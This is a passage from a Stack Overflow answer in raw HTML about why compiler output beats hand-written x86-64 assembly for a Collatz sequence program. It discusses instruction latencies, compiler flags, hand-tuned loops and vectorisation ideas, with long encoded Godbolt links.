JwJCQHdDhY/6nVb6hC551cdPotLSvnEI5oDyfeMi0C4MbUAbCw2IRTsABI1s9W4wNtIg7ICwxAPiwQwbUvYOtkllGwIdAorpbIg0CCGo%2BnoCYyv%2BMQOs1yAYHBctlEc2jFFOxpdTjFk%2BkcKUHRzsEBoHGS6VQRia2YX8Na1pvR0y8hteqy6Nxy/554bqnG7y3/IceCcK0XKKxRooRK7DtK2oQTQCwq%2BxiqxhAYdlxqylFq6WJmxJgZfq7JsO0gsyDd7S%2Ba2pla7ija3CHa51I67ZzSC6/ym63UST8EQZbZgjn605i5hABM55hva0uG0apGwFtG8FtT/G3CWWIcY58moPmmq6257iB51Cl540JV4sEvobFaDaC8DbUwDswnGsrs9lQlUlQpClWlYqCYt/W%2Brr3Fc4/cyDX1abQNUyECnCCJZMLRcHRJeOTxf8evrpnM5KBiHGRiI0o2At9hg1hVL6C4NtAbI4A3diwbJ7MAwN0N/wysGIW0tU9/ZMnyt97PKgrs49872JW7xIyPd/rpisD6PUI4BlgnA47UKsKsLi18Mn4S29%2BGxn4U75t9x318sQ7Yx3LY%2BqiROa4D3/fV0iOiy3Vi6sOQ7QHzbUHzbQAnE34N7wwSwba2WF7szqrYzn5v%2BaAnCErY/5svgnEFgkb0t3wKr3%2BjYjYhADQNWjVByKw8xaf8TZlBV8wmOqC4E%2BmLr2N122gmxlsQIW6oknzCJIv%2BcuBKMDCTrlwu6kyXulyF7AD1Cw54LkPpT0CMASgnAZKCIBaDO9YBBYcuJjxRYSAOmUHO/sjUf5xUQaL/OEO/iwqpJxK//K0IkhhQtBLKjYRlNzR5KHoyg39QwrY1ORuUYmuzY2rY3t7f0ratjDXtmRBZAwKQLSCers2wCW9LmGEVyvS07J39QIIgiYGoMkQtJja3gXZpgHWAmwDBrlHEHf0VDmDLBVOawdSFsEkR1gOVXxkYKMzZgdoioQfn42TRW1PA9lboniVDYhNsCjjLYFQHNSuMDA7jEoEr30YMQy0AKBbOuBSQh5kg8NTwGk0H74ANU%2BAWxo8CSiSCLm1zHEFckH6QIf4%2BjXZgPzMFksEmkvR4NnjmgtBJYz7fwKfwlxAhe4HAeQQRCKb8BJSK4JJg0HDi2VCAPdeIZ4y153wuCJzPeHBUnSPdmw7IUDs2G/rhDpGdlKYboEaBdF4sOINJsP1cTX9tg%2BATuGE2pDEZ0AkbYsLIGLA4h5h2KRYWcEkw8AcQ2wk5tSDaRD8XE6QC2vGVAiTCiA%2Bww4S0kXhD8uCWTbQYywIaeM4kUzRlFhkwAdBbUDGLoAzVCC/Dw2GTDVFk2eEkt8Rw/IhMv1EgMQ74JI8FqICBEgi9hMwxIbZyyA7BNIZIoobszhBsj/glJBim6neDoAcQ6KTSKa3Xj9CYw4wwKpyM5EMQRRPIjkGOlyB1oUBfyHEBwGGGsiaWhzDkT/UVDsA6E3ENCjH3Qrck76uQIgcnVvApJCwagJcP0HyiegfiH/dMh/jDCaCHBmgjykZiyC78fhXyWyhVEYBhU7wVwslq3Dz4RjwuAATWzCNA%2BRvYNUdWAnSfC54UIsllwXx4qgDYqCKUaIBOFsiCh4KDgEmL3Thxs62dX0NIDMATVpABsBQNs2kC0AFAqAGQDvU2AqhrwVgUZo4CbGkBrGcgKsWYG/61BaAHDBOPYCQb1BPYDQBoKsCAQ1j6gCgKQB6VIANj5ADAGQAoC4BXB%2BxpgUgHAFgBIA8kZACgCPSkg7gUAADOOAnCuBPpgeK4SgL5GMAKAlAU3AgJoDfDPjSA%2BAQsE/jgZcABx5Acas%2BLMBMBn8nAGQCCFuAgNuse6GCbt02zRc5o91EQCCAbBOoqGIDGhtA3YS0VCgvkTjoYCrGkAaxdY1cV%2BJbF2AnAcYMQkcHn4ghrYMcaIvHATgcMFAu44iRACPFv0dw5AbgDxPmTAAKmpAO8cSi4Bv4vxr4o6B%2BMKBfifxkRf8V%2BOSBWgQJDAZgDfQAlQS7gIiAIP8A678AE4y/EELBJyTGSEJCUJCQWBQnY10JIDMBsRNIn1iKJMgaIDRNkR0TagDE2XKQzuC1AKG7E1SVxJQACSTx/E88fMgyQ9lVgIk1QGJMfGSSDo0ktgJ%2BMAnyS/xQlJScBIHGgT1JL%2BSCdBOMlwSzJCxEBm8BhQghkJy2GyWeEwkQMkB/wXCf%2BwIku4iJ1YmQGRLXHNiXJ1E0bh5K8moho84IVYAFOylDiQATDROLIFWC0AZ%2BDfTRpo09gkSZAi40gMuIVjkTAJlErcSAFtgcTdQS06QPYCcmbTNxfYkCWYD9oyN6gQAA"" rel=""noreferrer"">@hidefromkgb asm optimized by @Peter Cordes</a> avg 145 ms</p></li>
<li><p><a href=""https://godbolt.org/g/1N70Ib"" rel=""noreferrer"">@Veedrac C++</a> avg 81 ms with <code>-O3</code>, 305 ms with <code>-O0</code></p></li>
</ul>
","<p>If you think a 64-bit DIV instruction is a good way to divide by two, then no wonder the compiler's asm output beat your hand-written code, even with <code>-O0</code> (compile fast, no extra optimization, and store/reload to memory after/before every C statement so a debugger can modify variables).</p>

<p>See <a href=""http://agner.org/optimize/"" rel=""noreferrer"">Agner Fog's Optimizing Assembly guide</a> to learn how to write efficient asm.  He also has instruction tables and a microarch guide for specific details for specific CPUs.  See also the <a href=""/questions/tagged/x86"" class=""post-tag"" title=""show questions tagged &#39;x86&#39;"" rel=""tag"">x86</a> tag wiki for more perf links.</p>

<p>See also this more general question about beating the compiler with hand-written asm: <a href=""https://stackoverflow.com/questions/9601427"">Is inline assembly language slower than native C++ code?</a>.  TL:DR: yes if you do it wrong (like this question).</p>

<p>Usually you're fine letting the compiler do its thing, especially if you <strong>try to write C++ that can compile efficiently</strong>.  Also see <a href=""https://stackoverflow.com/questions/1866316/assembly-language-compiled-languages"">is assembly faster than compiled languages?</a>.  One of the answers links to <a href=""http://www.linux-kongress.org/2009/slides/compiler_survey_felix_von_leitner.pdf"" rel=""noreferrer"">these neat slides</a> showing how various C compilers optimize some really simple functions with cool tricks.</p>

<hr>

<pre><code>even:
    mov rbx, 2
    xor rdx, rdx
    div rbx
</code></pre>

<p>On Intel Haswell, <strong><code>div r64</code></strong> is 36 uops, with a <strong>latency of 32-96 cycles</strong>, and a throughput of one per 21-74 cycles.  (Plus the 2 uops to set up RBX and zero RDX, but out-of-order execution can run those early).  <a href=""https://stackoverflow.com/q/26907523/224132"">High-uop-count instructions like DIV are microcoded, which can also cause front-end bottlenecks.</a> In this case, latency is the most relevant factor because it's part of a loop-carried dependency chain.</p>

<p><strong><code>shr rax, 1</code> does the same unsigned division: It's 1 uop, with 1c latency</strong>, and can run 2 per clock cycle.</p>

<p>For comparison, 32-bit division is faster, but still horrible vs. shifts. <code>idiv r32</code> is 9 uops, 22-29c latency, and one per 8-11c throughput on Haswell.</p>

<hr>

<p><strong>As you can see from looking at gcc's <code>-O0</code> asm output (<a href=""http://gcc.godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(j:1,options:(colouriseAsm:&#39;0&#39;,compileOnChange:&#39;0&#39;),source:&#39;%23include+%3Ciostream%3E%0A%23include+%3Cstdint.h%3E%0Ausing+namespace+std%3B%0A%0A//+unsigned+types+give+better+asm+output+for+divides+by+2.%0A//+Even+with+-O3,+%60long%60+sucks+(try+it:+godbolt+recompiles+automatically+after+edits)%0A//+I+used+this+version+as+a+starting+point+for+hand-optimizing.%0Aint+sequence(uint64_t+n)+%7B%0A++//+CHANGED+FROM+THE+QUESTION!&#39;S+CODE:+long+-%3E+uint64_t+%0A++++int+count+%3D+1%3B%0A++++while+(n+!!%3D+1)+%7B%0A++++++++if+(n+%25+2+%3D%3D+0)%0A++++++++++++n+/%3D+2%3B%0A++++++++else%0A++++++++++++n+%3D+n*3+%2B+1%3B%0A%0A++++++++%2B%2Bcount%3B%0A++++%7D%0A++++return+count%3B%0A%7D%0A%0Aint+main()+%7B%0A++++int+max+%3D+0,+maxi%3B%0A++++for+(int+i+%3D+999999%3B+i+%3E+0%3B+--i)+%7B%0A++++++++int+s+%3D+sequence(i)%3B%0A++++++++if+(s+%3E+max)+%7B%0A++++++++++++max+%3D+s%3B%0A++++++++++++maxi+%3D+i%3B%0A++++++++%7D%0A++++%7D%0A++++cout+%3C%3C+maxi+%3C%3C+endl%3B%0A%7D%0A%0A//+as+discussed,+gcc+-O0+still+uses+a+multiplicative+inverse%0A//+for+non-power-of-2+constants%0Aunsigned+long+div_by_13(unsigned+long+a)+%7B%0A++return+a/13%3B%0A%7D%0A&#39;),l:&#39;5&#39;,n:&#39;1&#39;,o:&#39;C%2B%2B+source+%231&#39;,t:&#39;0&#39;)),k:40.81295963439001,l:&#39;4&#39;,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;),(g:!((h:compiler,i:(compiler:g540,filters:(b:&#39;0&#39;,commentOnly:&#39;0&#39;,directives:&#39;0&#39;,intel:&#39;0&#39;),options:&#39;-O0+-std%3Dgnu%2B%2B11+-Wall+-Wextra+-fverbose-asm&#39;),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;%231+with+x86-64+gcc+5.4&#39;,t:&#39;0&#39;)),k:31.237103409492676,l:&#39;4&#39;,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;),(g:!((h:compiler,i:(compiler:g540,filters:(b:&#39;0&#39;,commentOnly:&#39;0&#39;,directives:&#39;0&#39;,intel:&#39;0&#39;),options:&#39;-O3+-std%3Dgnu%2B%2B11+-Wall+-Wextra+-fno-verbose-asm&#39;),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;%231+with+x86-64+gcc+5.4&#39;,t:&#39;0&#39;)),k:27.94993695611732,l:&#39;4&#39;,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;)),l:&#39;2&#39;,n:&#39;0&#39;,o:&#39;&#39;,t:&#39;0&#39;)),version:4"" rel=""noreferrer"">Godbolt compiler explorer</a>), it only uses shifts instructions</strong>. clang <code>-O0</code> does compile naively like you thought, even using 64-bit IDIV twice. (When optimizing, compilers do use both outputs of IDIV when the source does a division and modulus with the same operands, if they use IDIV at all)</p>

<p>GCC doesn't have a totally-naive mode; <a href=""https://stackoverflow.com/a/33284629/224132"">it always transforms through GIMPLE, which means some ""optimizations"" can't be disabled</a>.  This includes recognizing division-by-constant and using shifts (power of 2) or <a href=""https://stackoverflow.com/questions/41183935/why-does-gcc-use-multiplication-by-a-strange-number-in-implementing-integer-divi"">a fixed-point multiplicative inverse</a> (non power of 2) to avoid IDIV (see <code>div_by_13</code> in the above godbolt link).</p>

<p><code>gcc -Os</code> (optimize for size) <em>does</em> use IDIV for non-power-of-2 division,
unfortunately even in cases where the multiplicative inverse code is only slightly larger but much slower.</p>

<hr>

<h1>Helping the compiler</h1>

<p>(summary for this case: use <code>uint64_t n</code>)</p>

<p>First of all, it's only interesting to look at optimized compiler output.  (<code>-O3</code>).  <strong><a href=""https://stackoverflow.com/a/32001196/224132""><code>-O0</code> speed is basically meaningless.</a></strong></p>

<p>Look at your asm output (on Godbolt, or see <a href=""https://stackoverflow.com/q/38552116/224132"">How to remove &quot;noise&quot; from GCC/clang assembly output?</a>).  When the compiler doesn't make optimal code in the first place: <strong>Writing your C/C++ source in a way that guides the compiler into making better code is usually the best approach</strong>.  You have to know asm, and know what's efficient, but you apply this knowledge indirectly.  Compilers are also a good source of ideas: sometimes clang will do something cool, and you can hand-hold gcc into doing the same thing: see <a href=""https://stackoverflow.com/a/34410357/224132"">this answer</a> and what I did with the non-unrolled loop in @Veedrac's code below.)</p>

<p>This approach is portable, and in 20 years some future compiler can compile it to whatever is efficient on future hardware (x86 or not), maybe using new ISA extension or auto-vectorizing.  Hand-written x86-64 asm from 15 years ago would usually not be optimally tuned for Skylake.  e.g. compare&amp;branch macro-fusion didn't exist back then.  <strong>What's optimal now for hand-crafted asm for one microarchitecture might not be optimal for other current and future CPUs.</strong>  <a href=""https://stackoverflow.com/questions/40354978/why-is-this-c-code-faster-than-my-hand-written-assembly-for-testing-the-collat#comment67966852_40356449"">Comments on @johnfound's answer</a> discuss major differences between AMD Bulldozer and Intel Haswell, which have a big effect on this code.  But in theory, <code>g++ -O3 -march=bdver3</code> and <code>g++ -O3 -march=skylake</code> will do the right thing.  (Or <code>-march=native</code>.)   Or <code>-mtune=...</code> to just tune, without using instructions that other CPUs might not support.</p>

<p>My feeling is that guiding the compiler to asm that's good for a current CPU you care about shouldn't be a problem for future compilers.  They're hopefully better than current compilers at finding ways to transform code, and can find a way that works for future CPUs.  Regardless, future x86 probably won't be terrible at anything that's good on current x86, and the future compiler will avoid any asm-specific pitfalls while implementing something like the data movement from your C source, if it doesn't see something better.</p>

<p>Hand-written asm is a black-box for the optimizer, so constant-propagation doesn't work when inlining makes an input a compile-time constant.  Other optimizations are also affected.  Read <a href=""https://gcc.gnu.org/wiki/DontUseInlineAsm"" rel=""noreferrer"">https://gcc.gnu.org/wiki/DontUseInlineAsm</a> before using asm.  (And avoid MSVC-style inline asm: inputs/outputs have to go through memory <a href=""https://stackoverflow.com/a/35959859/224132"">which adds overhead</a>.)</p>

<p><strong>In this case</strong>: your <code>n</code> has a signed type, and gcc uses the SAR/SHR/ADD sequence that gives the correct rounding.  (IDIV and arithmetic-shift ""round"" differently for negative inputs, see the <a href=""http://www.felixcloutier.com/x86/SAL:SAR:SHL:SHR.html"" rel=""noreferrer"">SAR insn set ref manual entry</a>).  (IDK if gcc tried and failed to prove that <code>n</code> can't be negative, or what.  Signed-overflow is undefined behaviour, so it should have been able to.)</p>

<p>You should have used <code>uint64_t n</code>, so it can just SHR.  And so it's portable to systems where <code>long</code> is only 32-bit (e.g. x86-64 Windows).</p>

<hr>

<p>BTW, <strong>gcc's <em>optimized</em> asm output looks pretty good (using <code>unsigned long n</code>)</strong>: the inner loop it inlines into <code>main()</code> does this:</p>

<pre><code> # from gcc5.4 -O3  plus my comments

 # edx= count=1
 # rax= uint64_t n

.L9:                   # do{
    lea    rcx, [rax+1+rax*2]   # rcx = 3*n + 1
    mov    rdi, rax
    shr    rdi         # rdi = n&gt;&gt;1;
    test   al, 1       # set flags based on n%2 (aka n&amp;1)
    mov    rax, rcx
    cmove  rax, rdi    # n= (n%2) ? 3*n+1 : n/2;
    add    edx, 1      # ++count;
    cmp    rax, 1
    jne   .L9          #}while(n!=1)

  cmp/branch to update max and maxi, and then do the next n
</code></pre>

<p>The inner loop is branchless, and the critical path of the loop-carried dependency chain is:</p>

<ul>
<li>3-component LEA (3 cycles)</li>
<li>cmov (2 cycles on Haswell, 1c on Broadwell or later).</li>
</ul>

<p><strong>Total: 5 cycle per iteration, latency bottleneck</strong>.  Out-of-order execution takes care of everything else in parallel with this (in theory: I haven't tested with perf counters to see if it really runs at 5c/iter).</p>

<p>The FLAGS input of <code>cmov</code> (produced by TEST) is faster to produce than the RAX input (from LEA->MOV), so it's not on the critical path.</p>

<p>Similarly, the MOV->SHR that produces CMOV's RDI input is off the critical path, because it's also faster than the LEA.  MOV on IvyBridge and later has zero latency (handled at register-rename time).  (It still takes a uop, and a slot in the pipeline, so it's not free, just zero latency).  The extra MOV in the LEA dep chain is part of the bottleneck on other CPUs.</p>

<p>The cmp/jne is also not part of the critical path: it's not loop-carried, because control dependencies are handled with branch prediction + speculative execution, unlike data dependencies on the critical path.</p>

<hr>

<h1>Beating the compiler</h1>

<p>GCC did a pretty good job here.  It could save one code byte by using <a href=""https://stackoverflow.com/a/36510865/224132""><code>inc edx</code> instead of <code>add edx, 1</code></a>, because nobody cares about P4 and its false-dependencies for partial-flag-modifying instructions.</p>

<p>It could also save all the MOV instructions, and the TEST:  SHR sets CF= the bit shifted out, so we can use <code>cmovc</code> instead of <code>test</code> / <code>cmovz</code>.</p>

<pre><code> ### Hand-optimized version of what gcc does
.L9:                       #do{
    lea     rcx, [rax+1+rax*2] # rcx = 3*n + 1
    shr     rax, 1         # n&gt;&gt;=1;    CF = n&amp;1 = n%2
    cmovc   rax, rcx       # n= (n&amp;1) ? 3*n+1 : n/2;
    inc     edx            # ++count;
    cmp     rax, 1
    jne     .L9            #}while(n!=1)
</code></pre>

<p>See @johnfound's answer for another clever trick: remove the CMP by branching on SHR's flag result as well as using it for CMOV:  zero only if n was 1 (or 0) to start with.  (Fun fact: <a href=""https://stackoverflow.com/a/36510865/224132"">SHR with count != 1 on Nehalem or earlier causes a stall if you read the flag results</a>.  That's how they made it single-uop.  The shift-by-1 special encoding is fine, though.)</p>

<p>Avoiding MOV doesn't help with the latency at all on Haswell (<a href=""https://stackoverflow.com/q/44169342"">Can x86&#39;s MOV really be &quot;free&quot;? Why can&#39;t I reproduce this at all?</a>).  It does help <em>significantly</em> on CPUs like Intel pre-IvB, and AMD Bulldozer-family, where MOV is not zero-latency.  The compiler's wasted MOV instructions do affect the critical path.  BD's complex-LEA and CMOV are both lower latency (2c and 1c respectively), so it's a bigger fraction of the latency.  Also, throughput bottlenecks become an issue, because it only has two integer ALU pipes.  <a href=""https://stackoverflow.com/questions/40354978/why-is-this-c-code-faster-than-assembly/40356449#40356449"">See @johnfound's answer</a>, where he has timing results from an AMD CPU.</p>

<p>Even on Haswell, this version may help a bit by avoiding some occasional delays where a non-critical uop steals an execution port from one on the critical path, delaying execution by 1 cycle.  (This is called a resource conflict).  It also saves a register, which may help when doing multiple <code>n</code> values in parallel in an interleaved loop (see below).</p>

<p><strong>LEA's latency depends on the addressing mode</strong>, on Intel SnB-family CPUs.  3c for 3 components (<code>[base+idx+const]</code>, which takes two separate adds), but only 1c with 2 or fewer components (one add).  Some CPUs (like Core2) do even a 3-component LEA in a single cycle, but SnB-family doesn't.  Worse, <a href=""https://stackoverflow.com/a/40212446/224132"">Intel SnB-family standardizes latencies so there are no 2c uops</a>, otherwise 3-component LEA would be only 2c like Bulldozer.  (3-component LEA is slower on AMD as well, just not by as much).</p>

<p>So <code>lea  rcx, [rax + rax*2]</code> / <code>inc rcx</code> is only 2c latency, faster than <code>lea  rcx, [rax + rax*2 + 1]</code>, on Intel SnB-family CPUs like Haswell.  Break-even on BD, and worse on Core2.  It does cost an extra uop, which normally isn't worth it to save 1c latency, but latency is the major bottleneck here and Haswell has a wide enough pipeline to handle the extra uop throughput.</p>

<p><strong>Neither gcc, icc, nor clang (on godbolt) used SHR's CF output, always using an AND or TEST</strong>.  Silly compilers. :P  They're great pieces of complex machinery, but a clever human can often beat them on small-scale problems.  (Given thousands to millions of times longer to think about it, of course!  Compilers don't use exhaustive algorithms to search for every possible way to do things, because that would take too long when optimizing a lot of inlined code, which is what they do best.  They also don't model of the pipeline in the target microarchitecture; they just use some heuristics.)</p>

<hr>

<p><strong>Simple loop unrolling won't help</strong>; this loop bottlenecks on the latency of a loop-carried dependency chain, not on loop overhead / throughput.  This means it would do well with hyperthreading (or any other kind of SMT), since the CPU has lots of time to interleave instructions from two threads.  This would mean parallelizing the loop in <code>main</code>, but that's fine because each thread can just check a range of <code>n</code> values and produce a pair of integers as a result.</p>

<p><strong>Interleaving by hand within a single thread might be viable, too</strong>.  Maybe compute the sequence for a pair of numbers in parallel, since each one only takes a couple registers, and they can all update the same <code>max</code> / <code>maxi</code>.  This creates more <a href=""https://en.wikipedia.org/wiki/Instruction-level_parallelism"" rel=""noreferrer"">instruction-level parallelism</a>.</p>

<p>The trick is deciding whether to wait until all the <code>n</code> values have reached <code>1</code> before getting another pair of starting <code>n</code> values, or whether to break out and get a new start point for just one that reached the end condition, without touching the registers for the other sequence.  Probably it's best to keep each chain working on useful data, otherwise you'd have to conditionally increment its counter.</p>

<hr>

<p>You could maybe even do this with SSE packed-compare stuff to conditionally increment the counter for vector elements where <code>n</code> hadn't reached <code>1</code> yet.  And then to hide the even longer latency of a SIMD conditional-increment implementation, you'd need to keep more vectors of <code>n</code> values up in the air.  Maybe only worth with 256b vector (4x <code>uint64_t</code>).</p>

<p>I think the best strategy to make detection of a <code>1</code> ""sticky"" is to mask the vector of all-ones that you add to increment the counter.  So after you've seen a <code>1</code> in an element, the increment-vector will have a zero, and +=0 is a no-op.</p>

<h3>Untested idea for manual vectorization</h3>

<pre><code># starting with YMM0 = [ n_d, n_c, n_b, n_a ]  (64-bit elements)
# ymm4 = _mm256_set1_epi64x(1):  increment vector
# ymm5 = all-zeros:  count vector

.inner_loop:
    vpaddq    ymm1, ymm0, xmm0
    vpaddq    ymm1, ymm1, xmm0
    vpaddq    ymm1, ymm1, set1_epi64(1)     # ymm1= 3*n + 1.  Maybe could do this more efficiently?

    vprllq    ymm3, ymm0, 63                # shift bit 1 to the sign bit

    vpsrlq    ymm0, ymm0, 1                 # n /= 2

    # There may be a better way to do this blend, avoiding the bypass delay for an FP blend between integer insns, not sure.  Probably worth it
    vpblendvpd ymm0, ymm0, ymm1, ymm3       # variable blend controlled by the sign bit of each 64-bit element.  I might have the source operands backwards, I always have to look this up.

    # ymm0 = updated n  in each element.

    vpcmpeqq ymm1, ymm0, set1_epi64(1)
    vpandn   ymm4, ymm1, ymm4         # zero out elements of ymm4 where the compare was true

    vpaddq   ymm5, ymm5, ymm4         # count++ in elements where n has never been == 1

    vptest   ymm4, ymm4
    jnz  .inner_loop
    # Fall through when all the n values have reached 1 at some point, and our increment vector is all-zero

    vextracti128 ymm0, ymm5, 1
    vpmaxq .... crap this doesn't exist
    # Actually just delay doing a horizontal max until the very very end.  But you need some way to record max and maxi.
</code></pre>

<p>You can and should implement this with intrinsics, instead of hand-written asm.</p>

<hr>

<h2>Algorithmic / implementation improvement:</h2>

<p>Besides just implementing the same logic with more efficient asm, look for ways to simplify the logic, or avoid redundant work.  e.g. memoize to detect common endings to sequences.  Or even better, look at 8 trailing bits at once (gnasher's answer)</p>

<p>@EOF points out that <code>tzcnt</code> (or <code>bsf</code>) could be used to do multiple <code>n/=2</code> iterations in one step.  That's probably better than SIMD vectorizing, because no SSE or AVX instruction can do that.  It's still compatible with doing multiple scalar <code>n</code>s in parallel in different integer registers, though.</p>

<p>So the loop might look like this:</p>

<pre><code>goto loop_entry;  // C++ structured like the asm, for illustration only
do {
   n = n*3 + 1;
  loop_entry:
   shift = _tzcnt_u64(n);
   n &gt;&gt;= shift;
   count += shift;
} while(n != 1);
</code></pre>

<p>This may do significantly fewer iterations, but variable-count shifts are slow on Intel SnB-family CPUs without BMI2.  3 uops, 2c latency.  (They have an input dependency on the FLAGS because count=0 means the flags are unmodified.  They handle this as a data dependency, and take multiple uops because a uop can only have 2 inputs (pre-HSW/BDW anyway)).  This is the kind that people complaining about x86's crazy-CISC design are referring to.  It makes x86 CPUs slower than they would be if the ISA was designed from scratch today, even in a mostly-similar way.  (i.e. this is part of the ""x86 tax"" that costs speed / power.)  SHRX/SHLX/SARX (BMI2) are a big win (1 uop / 1c latency).</p>

<p>It also puts tzcnt (3c on Haswell and later) on the critical path, so it significantly lengthens the total latency of the loop-carried dependency chain.  It does remove any need for a CMOV, or for preparing a register holding <code>n&gt;&gt;1</code>, though.  <strong>@Veedrac's answer overcomes all this by deferring the tzcnt/shift for multiple iterations, which is highly effective (see below).</strong></p>

<p>We can safely use <a href=""http://www.felixcloutier.com/x86/BSF.html"" rel=""noreferrer"">BSF</a> or <a href=""http://www.felixcloutier.com/x86/TZCNT.html"" rel=""noreferrer"">TZCNT</a> interchangeably, because <code>n</code> can never be zero at that point.  TZCNT's machine-code decodes as BSF on CPUs that don't support BMI1.  (Meaningless prefixes are ignored, so REP BSF runs as BSF).</p>

<p>TZCNT performs much better than BSF on AMD CPUs that support it,  so it can be a good idea to use <code>REP BSF</code>, even if you don't care about setting ZF if the input is zero rather than the output.  Some compilers do this when you use <code>__builtin_ctzll</code> even with <code>-mno-bmi</code>.  </p>

<p>They perform the same on Intel CPUs, so just save the byte if that's all that matters.  TZCNT on Intel (pre-Skylake) still has a false-dependency on the supposedly write-only output operand, just like BSF, to support the undocumented behaviour that BSF with input = 0 leaves its destination unmodified.  So you need to work around that unless optimizing only for Skylake, so there's nothing to gain from the extra REP byte.  (Intel often goes above and beyond what the x86 ISA manual requires, to avoid breaking widely-used code that depends on something it shouldn't, or that is retroactively disallowed.  e.g. <a href=""http://blog.stuffedcow.net/2015/08/pagewalk-coherence/"" rel=""noreferrer"">Windows 9x's assumes no speculative prefetching of TLB entries</a>, which was safe when the code was written, <a href=""https://stackoverflow.com/questions/17395557/observing-stale-instruction-fetching-on-x86-with-self-modifying-code#comment68191467_18388700"">before Intel updated the TLB management rules</a>.)</p>

<p>Anyway, LZCNT/TZCNT on Haswell have the same false dep as POPCNT: see <a href=""https://stackoverflow.com/questions/25078285/replacing-a-32-bit-loop-count-variable-with-64-bit-introduces-crazy-performance"">this Q&amp;A</a>.  This is why in gcc's asm output for @Veedrac's code, you see it <a href=""https://stackoverflow.com/a/33668295/224132"">breaking the dep chain with xor-zeroing</a> on the register it's about to use as TZCNT's destination, when it doesn't use dst=src.  Since TZCNT/LZCNT/POPCNT never leave their destination undefined or unmodified, this false dependency on the output on Intel CPUs is purely a performance bug / limitation.  Presumably it's worth some transistors / power to have them behave like other uops that go to the same execution unit.  The only software-visible upside is in the interaction with another microarchitectural limitation: <a href=""https://stackoverflow.com/questions/26046634/micro-fusion-and-addressing-modes"">they can micro-fuse a memory operand with an indexed addressing mode</a> on Haswell, but on Skylake where Intel removed the false dependency for LZCNT/TZCNT they ""un-laminate"" indexed addressing modes while POPCNT can still micro-fuse any addr mode.</p>

<hr>

<h1>Improvements to ideas / code from other answers:</h1>

<p><strong>@hidefromkgb's answer</strong> has a nice observation that you're guaranteed to be able to do one right shift after a 3n+1.  You can compute this more even more efficiently than just leaving out the checks between steps.  The asm implementation in that answer is broken, though (it depends on OF, which is undefined after SHRD with a count > 1), and slow: <code>ROR rdi,2</code> is faster than <code>SHRD rdi,rdi,2</code>, and using two CMOV instructions on the critical path is slower than an extra TEST that can run in parallel.</p>

<p>I put tidied / improved C (which guides the compiler to produce better asm), and tested+working faster asm (in comments below the C) up on Godbolt: see the link in <a href=""https://stackoverflow.com/questions/40354978/why-is-this-c-code-faster-than-my-hand-written-assembly-for-testing-the-collat/40367384#40367384"">@hidefromkgb's answer</a>.  (This answer hit the 30k char limit from the large Godbolt URLs, but <a href=""https://meta.stackoverflow.com/questions/319549/how-are-we-supposed-to-post-godbolt-links-now-that-url-shortening-is-blocked/319594#319594"">shortlinks can rot</a> and were too long for goo.gl anyway.)</p>

<p>Also improved the output-printing to convert to a string and make one <code>write()</code> instead of writing one char at a time. This minimizes impact on timing the whole program with <code>perf stat ./collatz</code> (to record performance counters), and I de-obfuscated some of the non-critical asm.</p>

<hr>

<p><strong>@Veedrac's code</strong></p>

<p>I got a very small speedup from right-shifting as much as we <em>know</em> needs doing, and checking to continue the loop.  From 7.5s for limit=1e8 down to 7.275s, on Core2Duo (Merom), with an unroll factor of 16.</p>

<p>code + comments <a href=""http://gcc.godbolt.org/#z:OYLghAFBqd5QCxAYwPYBMCmBRdBLAF1QCcAaPECAKxAEZTUAHAvVAOwGdK0AbVAV2J4OmAIIcAtiADkABmmk0Exnh6YA8mwDCCAIZtgmGfICUpDgOLIj0gPS2A1BIx4AZnkzoHAN0zEOrGwOqK4OAGqYnsS6yGDSHA5oWCAApLKi9omCxJhsBD5%2BAeyJqMqqmAkA7pg8PA6VhAgOwMjIaRmOAMoAMuoA6g5a6gAi2A59AJIAKgASg92iAHIA4g4QmAAeBNEOAFIAsgAKCXhBBAiYDliufg58TCbt7ZnXt/eMV6gVwWyXAEZ4YAOITABAEAC0HAQbnyjFuwGIAkYpAc%2Bi87B4AE87phdL4qhcgsg%2BCIHERgr5iK4%2BJUAHRPdKZXQ8Cwo86XAIGNSQgiYD7vBz8EQJAAC0OuiIkAGtgH84glecgEGw8ABHfiYBmiFIAJgAzKdifwsA4UnqtMgOAR8HkzdgnvrDTxjZczVpWFacroJHatULTkC2N6KowYhzrWaAEJaq26FjIQWnAgANgALAB9fKc4BqND8PKmvXDByyKMOByZPMFkJkoSMBUIRH8UFki4ONjscGvYg5Lzvdqx%2BOJvJpzMOWOYzzp07pgVm4ulvWR8uZAVoNj4FjFSq6BXEDWo/Lshy5dGhY9YHi6SfoSHQ1z5fvpQd4BPrq0OP6oVB1U6e/gSLk%2BTzg4rjMiIUYxgQcavsOBB6jqY4iOquTWBA/BJghY4bCYpoAOzRukDoGq4G6YKEACqiwAErqN03TpkMVFTMR1ynJcVG0fRjHqMxDi0MmK6OPmiK1J%2B2ICQ4wigbuvJWiADh4bS%2BoJHCxD8ZgAAcTi6KcArQK0ACsykoloJCYDqwz8Kgaz7H4pS4TqtKpssMwAF6PER%2Bqnm47TluW775BheRYfkCJIumARua6RYOJxdEMUxiwsUufn%2BZkyyIpUCR/NiugycgRDqbQsi2HqawgXwwA6hAJVlbhKTYDqKSaQAnC12m0LSeGpp%2BhAcLhuJKsCAgbvS6T%2BRWjgTAQ8rjroNxSaEhCJPozRZSelLYoQfgwdujQCPkqCUtSqANAY42iJNgVwaOR0nTS6YAgQCQgcm5XgutEVRZcABU/E9RW/GyIuhFXf5N3BSmGb3X4p2VJFeDRYWxa0BR9GFloboUnDj3PRwkETeljj6NijBnbcNY6lJCT5VaTAlBuhCBApGJ5eOAZqH1WaYAQKIWPUlzIGtzI0lJ%2BRJjZx5PtqRPllDd3tijDgbIT4Py5hiH5FWwGxaDWqTZU0JcxA2wag1BFpZNUOhQ4UrK6DQmJFeBg6VK3yVCQpJJJcDTnA4abgs9dsOCAthW8TDjdLivjjveLCu%2BgZ1BK4JB3HGfiXZN5ZJ/hYNpK1GsjjD3NqwXRfwVrduGg7ZZTQ4Fw8GpoFpyJP48AG9SNFJWB5K%2BzIlCo3w1sefx8MgUparqepsb8DjTNg1HppGvRaAA0hADWGVjRGyIXFUEdzytBLqgngmwZa2P9Y8BA4v3h3vBfl9nKTbwy%2B/%2BW4azB/OIFsBby4damh1NGW